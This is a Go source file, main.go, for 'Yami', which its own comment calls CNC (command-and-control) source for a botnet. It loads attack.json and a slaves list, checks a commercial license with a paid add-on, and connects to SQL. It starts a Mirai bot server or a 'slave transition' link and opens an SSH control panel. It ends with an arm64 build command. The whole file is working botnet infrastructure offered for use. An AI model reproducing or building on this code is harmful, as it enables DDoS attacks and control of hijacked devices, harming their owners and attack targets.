package main

import (
	Branding "Yami/core/clients/branding"
	ClientPoly "Yami/core/clients/client"
	YamiDB "Yami/core/db"
	JsonParse "Yami/core/models/Json"
	BinLoad "Yami/core/models/bin"
	Options "Yami/core/models/config"
	License "Yami/core/models/license"
	YamiSshServer "Yami/core/models/server"
	SetupBuild "Yami/core/models/setup"
	slaves "Yami/core/slaves/mirai"
	"Yami/core/slaves/transition"
	"fmt"
	"log"
	"os"
	"runtime"
	"time"
)

var DevMode bool = false

// Yami CNC Source
func main() {

	fmt.Println("Starting Yami - " + Options.ClientVersion)

	Status, err := JsonParse.LoadAttacks()
	if err != nil && !Status {
		log.Printf("Failed To Load Attack Configuration")
		return
	} else {
		log.Printf(" [Loaded Attack Sync From attack.json Correctly]")
	}

	Status, err = JsonParse.LoadConfig()
	if err != nil && !Status {
		log.Printf("Failed To Load Config Configuration")
		return
	} else {
		log.Printf(" [Loaded Config Sync From config.json Correctly]")
	}

	Status, err = JsonParse.LoadOptions()
	if err != nil && !Status {
		log.Printf("Failed To Load options Configuration")
		return
	} else {
		log.Printf(" [Loaded options Sync From options.json Correctly]")
	}

	Status, err = JsonParse.LoadSlaves()
	if err != nil && !Status {
		log.Printf("Failed To Load slaves Configuration")
		return
	} else {
		log.Printf(" [Loaded slaves Sync From slaves.json Correctly]")
	}

	check := License.LicenseGet()
	if !check {
		os.Exit(1)
	}

	if License.LiveWire {
		Status, err = JsonParse.LoadLiveWire()
		if err != nil && !Status {
			log.Printf("Failed To Load Live Wire DLC Configuration")
			return
		} else {
			log.Printf(" [Loaded Config Sync From livewire-DLC.json Correctly]")
		}
	}

	error := YamiDB.Connection()
	if error != nil {
		log.Println("Failed To Open To SQL, Reason:", error.Error()+".")
		return
	}

	error = YamiDB.SQL.Ping()
	if error != nil {
		log.Println("Failed To Connect To SQL, Reason:", error.Error()+".")
		return
	}

	log.Println(" [Connected To SQL]")

	loaded, error := Branding.CompleteLoad()
	if error != nil {
		log.Printf("Failed to load any branding from branding folder")
		return
	}

	log.Printf(" [Loaded %d Items Of Branding Correctly]", loaded)

	if JsonParse.ConfigSyncs.SQL.SQLAudit.Status {
		There := SetupBuild.CheckTableExist()
		if !There {
			log.Printf(" [SQL Audit Has Failed, Building DB Now]")
			lol := SetupBuild.InsertTables()
			if lol {
				log.Printf(" [SQL Audit Complete]")
			}
		} else {
			log.Println(" [SQL Audit Has Passed!]")
		}
	}

	if JsonParse.ConfigSyncs.Slaves.Status {
		log.Println(" [Starting Local Mirai Server]")
		go slaves.Serve()
	} else if JsonParse.Option.SlaveTransition.Status {
		log.Println(" [Slave transition starting...]")
		go transition.Connection()
	}

	ClientPoly.OfflineLoader()

	BinLoad.OfflineLoad()

	YamiSshServer.NewSSH()
}

func DevLOL() {
	for {
		time.Sleep(1 * time.Second)

		fmt.Println(runtime.NumGoroutine())
	}
}

// GOOS=linux GOARCH=arm64 go build -o Yami main.go
